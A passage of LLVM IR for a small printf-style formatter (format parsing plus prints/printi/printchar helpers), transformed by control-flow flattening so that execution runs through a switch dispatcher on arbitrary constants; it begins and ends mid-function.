  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 -553176304, i32 842243396
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 245514027, i32 533973829
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 -531896579, i32 -561773542
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 842243396, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 -2056796477, i32 2093379696
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 -2106042395, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 1883069663, i32 -1434724283
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 -1434724283, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 -1830493780, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 -260970835, i32 -1316294091
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 -1830493780, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -1614826920, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 -2030489573, i32 736021250
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 736021250, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 1558300560, i32 -1705232074
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 -2032373310, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 -1614826920, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 -1888212462, i32 817722917
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 252251727, i32 -1647431711
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i32*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 1170784223, i32* %switchVar
  store i32* %103, i32** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i32*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 1170784223, i32* %switchVar
  store i32* %108, i32** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i32*, i32** %.reg2mem78
  %111 = load i32, i32* %.reload79, align 4
  %112 = sext i32 %111 to i64
  %113 = inttoptr i64 %112 to i8*
  store i8* %113, i8** %11, align 8
  %114 = load i8**, i8*** %4, align 8
  store i8** %114, i8*** %.reg2mem11
  %115 = load i8*, i8** %11, align 8
  %116 = icmp ne i8* %115, null
  %117 = select i1 %116, i32 622163159, i32 -177407630
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8*, i8** %11, align 8
  store i32 129371920, i32* %switchVar
  store i8* %119, i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 129371920, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %122 = load i32, i32* %7, align 4
  %123 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %124 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %122, i32 %123)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, %124
  store i32 %126, i32* %9, align 4
  store i32 -1990727210, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 100
  %132 = select i1 %131, i32 885051637, i32 41653547
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8**, i8*** %4, align 8
  store i8** %134, i8*** %.reg2mem13
  %135 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %135, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %136, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %137 = load i32, i32* %.reload21, align 8
  store i32 %137, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %138 = icmp ule i32 %.reload25, 40
  %139 = select i1 %138, i32 -1071242393, i32 45310766
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %142 = load i8*, i8** %141, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %143 = getelementptr i8, i8* %142, i32 %.reload24
  %144 = bitcast i8* %143 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %145 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %145, i32* %.reload20, align 8
  store i32 -219115567, i32* %switchVar
  store i32* %144, i32** %.reg2mem82
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %148 = load i8*, i8** %147, align 8
  %149 = bitcast i8* %148 to i32*
  %150 = getelementptr i8, i8* %148, i32 8
  store i8* %150, i8** %147, align 8
  store i32 -219115567, i32* %switchVar
  store i32* %149, i32** %.reg2mem82
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %152 = load i32, i32* %.reload83, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %155 = call i32 @printi(i8** %.reload14, i32 %152, i32 10, i32 1, i32 %153, i32 %154, i32 97)
  %156 = load i32, i32* %9, align 4
  %157 = add nsw i32 %156, %155
  store i32 %157, i32* %9, align 4
  store i32 -1990727210, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 120
  %163 = select i1 %162, i32 1923293691, i32 -2039231744
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8**, i8*** %4, align 8
  store i8** %165, i8*** %.reg2mem26
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %166, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %167, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %168 = load i32, i32* %.reload34, align 8
  store i32 %168, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %169 = icmp ule i32 %.reload38, 40
  %170 = select i1 %169, i32 1945442492, i32 1283881351
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %172 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %173 = load i8*, i8** %172, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %174 = getelementptr i8, i8* %173, i32 %.reload37
  %175 = bitcast i8* %174 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %176 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %176, i32* %.reload33, align 8
  store i32 1799815531, i32* %switchVar
  store i32* %175, i32** %.reg2mem84
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %179 = load i8*, i8** %178, align 8
  %180 = bitcast i8* %179 to i32*
  %181 = getelementptr i8, i8* %179, i32 8
  store i8* %181, i8** %178, align 8
  store i32 1799815531, i32* %switchVar
  store i32* %180, i32** %.reg2mem84
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %183 = load i32, i32* %.reload85, align 4
  %184 = load i32, i32* %7, align 4
  %185 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %186 = call i32 @printi(i8** %.reload27, i32 %183, i32 16, i32 0, i32 %184, i32 %185, i32 97)
  %187 = load i32, i32* %9, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %9, align 4
  store i32 -1990727210, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8*, i8** %5, align 8
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 88
  %194 = select i1 %193, i32 -930347478, i32 2049113017
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  store i8** %196, i8*** %.reg2mem39
  %197 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %197, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %198 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %198, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %199 = load i32, i32* %.reload47, align 8
  store i32 %199, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %200 = icmp ule i32 %.reload51, 40
  %201 = select i1 %200, i32 -1958011770, i32 479779934
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %205 = getelementptr i8, i8* %204, i32 %.reload50
  %206 = bitcast i8* %205 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %207 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %207, i32* %.reload46, align 8
  store i32 -445001715, i32* %switchVar
  store i32* %206, i32** %.reg2mem86
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  store i32 -445001715, i32* %switchVar
  store i32* %211, i32** %.reg2mem86
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %214 = load i32, i32* %.reload87, align 4
  %215 = load i32, i32* %7, align 4
  %216 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %217 = call i32 @printi(i8** %.reload40, i32 %214, i32 16, i32 0, i32 %215, i32 %216, i32 65)
  %218 = load i32, i32* %9, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %9, align 4
  store i32 -1990727210, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 117
  %225 = select i1 %224, i32 1766049930, i32 -1542311643
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  store i8** %227, i8*** %.reg2mem52
  %228 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %228, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %229 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %229, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %230 = load i32, i32* %.reload60, align 8
  store i32 %230, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %231 = icmp ule i32 %.reload64, 40
  %232 = select i1 %231, i32 -1183344936, i32 66723994
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %235 = load i8*, i8** %234, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %236 = getelementptr i8, i8* %235, i32 %.reload63
  %237 = bitcast i8* %236 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %238 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %238, i32* %.reload59, align 8
  store i32 -1768743503, i32* %switchVar
  store i32* %237, i32** %.reg2mem88
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %240 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %241 = load i8*, i8** %240, align 8
  %242 = bitcast i8* %241 to i32*
  %243 = getelementptr i8, i8* %241, i32 8
  store i8* %243, i8** %240, align 8
  store i32 -1768743503, i32* %switchVar
  store i32* %242, i32** %.reg2mem88
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %245 = load i32, i32* %.reload89, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %248 = call i32 @printi(i8** %.reload53, i32 %245, i32 10, i32 0, i32 %246, i32 %247, i32 97)
  %249 = load i32, i32* %9, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %9, align 4
  store i32 -1990727210, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 99
  %256 = select i1 %255, i32 -475155827, i32 1799409322
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %258, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %259, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %260 = load i32, i32* %.reload71, align 8
  store i32 %260, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %261 = icmp ule i32 %.reload75, 40
  %262 = select i1 %261, i32 -639026310, i32 -1170678610
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %266 = getelementptr i8, i8* %265, i32 %.reload74
  %267 = bitcast i8* %266 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %268 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %268, i32* %.reload70, align 8
  store i32 571854213, i32* %switchVar
  store i32* %267, i32** %.reg2mem90
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %270 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %271 = load i8*, i8** %270, align 8
  %272 = bitcast i8* %271 to i32*
  %273 = getelementptr i8, i8* %271, i32 8
  store i8* %273, i8** %270, align 8
  store i32 571854213, i32* %switchVar
  store i32* %272, i32** %.reg2mem90
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %275 = load i32, i32* %.reload91, align 4
  %276 = trunc i32 %275 to i8
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %276, i8* %277, align 1
  %278 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %278, align 1
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @prints(i8** %279, i8* %280, i32 %281, i32 %282)
  %284 = load i32, i32* %9, align 4
  %285 = add nsw i32 %284, %283
  store i32 %285, i32* %9, align 4
  store i32 -1990727210, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 -1529240999, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 -2106042395, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  call void @printchar(i8** %289, i32 %292)
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  store i32 -1529240999, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 -1990727210, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %5, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %5, align 8
  store i32 -287398973, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
  %301 = icmp ne i8** %300, null
  %302 = select i1 %301, i32 -197636550, i32 1949505073
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = load i8*, i8** %304, align 8
  store i8 0, i8* %305, align 1
  store i32 1949505073, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %308 = bitcast %struct.__va_list_tag* %307 to i8*
  call void @llvm.va_end(i8* %308)
  %309 = load i32, i32* %9, align 4
  ret i32 %309

loopEnd:                                          ; preds = %303, %299, %296, %295, %288, %287, %286, %274, %269, %263, %257, %251, %244, %239, %233, %226, %220, %213, %208, %202, %195, %189, %182, %177, %171, %164, %158, %151, %146, %140, %133, %127, %121, %120, %118, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 385703872, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 385703872, label %first
    i32 614104151, label %16
    i32 -936115626, label %18
    i32 -422183134, label %23
    i32 2126867481, label %26
    i32 -1501206431, label %29
    i32 -1341600515, label %34
    i32 1826830221, label %35
    i32 343363339, label %39
    i32 -1010098295, label %44
    i32 -1161845449, label %45
    i32 1795384702, label %46
    i32 1791446055, label %51
    i32 740644872, label %52
    i32 -2067778808, label %56
    i32 -1833725873, label %61
    i32 -633995782, label %64
    i32 156867654, label %65
    i32 451686640, label %66
    i32 1440128561, label %71
    i32 -384927298, label %78
    i32 -1356869656, label %81
    i32 407994098, label %82
    i32 -965987122, label %86
    i32 -548333828, label %91
    i32 -460877947, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 614104151, i32 1795384702
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 -936115626, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 -422183134, i32 -1501206431
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 2126867481, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 -936115626, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 -1341600515, i32 1826830221
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 343363339, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 343363339, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 -1010098295, i32 -1161845449
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 -1161845449, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 1795384702, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 156867654, i32 1791446055
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 740644872, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 -2067778808, i32 -633995782
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
